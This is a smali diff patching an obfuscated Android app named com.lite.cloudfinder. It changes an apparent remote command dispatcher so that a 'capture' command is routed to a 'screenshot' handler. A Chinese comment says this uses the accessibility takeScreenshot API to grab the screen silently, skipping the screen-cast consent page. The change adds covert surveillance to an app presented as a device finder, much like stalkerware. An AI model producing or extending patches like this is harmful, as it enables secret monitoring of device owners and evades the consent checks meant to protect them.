@@ -6507,19 +6507,21 @@
 .method public final ت()V
     .locals 3
 
-    new-instance v0, Landroid/content/Intent;
+    # capture：ScreenCaptureActivity 是空壳（2.1/2.2 都一样），直接复用 screenshot 通道
+    # （无障碍 takeScreenshot → 静默出图，无需投屏授权页）
+    new-instance v0, Lorg/json/JSONObject;
 
-    iget-object v1, p0, Lڜٟٱڀ/أ;->؋:Landroid/content/Context;
+    invoke-direct {v0}, Lorg/json/JSONObject;-><init>()V
 
-    const-class v2, Lcom/lite/cloudfinder/activity/ScreenCaptureActivity;
+    const-string v1, "screenshot"
 
-    invoke-direct {v0, v1, v2}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V
+    invoke-virtual {p0, v1, v0}, Lڜٟٱڀ/أ;->؋(Ljava/lang/String;Lorg/json/JSONObject;)V
 
-    const/high16 v2, 0x10000000
+    const-string v0, "CommandDispatcher"
 
-    invoke-virtual {v0, v2}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;
+    const-string v1, "capture -> forwarded to screenshot"
 
-    invoke-virtual {v1, v0}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V
+    invoke-static {v0, v1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I
 
     return-void
 .end method
